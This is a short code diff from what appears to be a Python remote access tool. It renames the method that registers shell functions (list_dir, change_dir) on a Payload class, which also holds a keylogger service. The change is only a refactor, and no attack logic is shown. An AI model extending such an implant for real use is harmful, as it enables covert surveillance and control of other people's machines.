@@ -101,9 +101,9 @@ class Payload(rpc.RPCDispatcher):
         self._file_service = FileService()
         self._keylogger_service = KeyloggerService()
 
-        self._register_shell_functions()
+        self.register_shell_functions()
 
-    def _register_shell_functions(self):
+    def register_shell_functions(self):
         funcs = [
                 list_dir,
                 change_dir,
